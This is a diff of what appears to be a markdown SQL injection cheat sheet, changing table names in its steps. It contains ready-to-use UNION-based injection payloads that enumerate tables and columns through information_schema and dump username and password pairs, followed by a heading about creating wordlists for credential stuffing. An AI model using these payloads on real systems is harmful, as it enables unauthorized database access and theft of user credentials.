@@ -29,13 +29,13 @@ Repeat this input until you get a response from the server
 
     ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Users' #
 
-### 6) Find the columns name of a table (Table=Users)
+### 6) Find the columns name of a table (Table=User)
 
-    ' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'Users' #
+    ' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'User' #
 
 ### 7) Dump data (group_concat(username,” | “,password))
 
-    ' union select 1,2,3,4,5,group_concat(username," | ",password) From users.UserDetails #
+    ' union select 1,2,3,4,5,group_concat(username," | ",password) From users.User #
 
 ### 8) Create wordlists for credential stuffing attacks
 
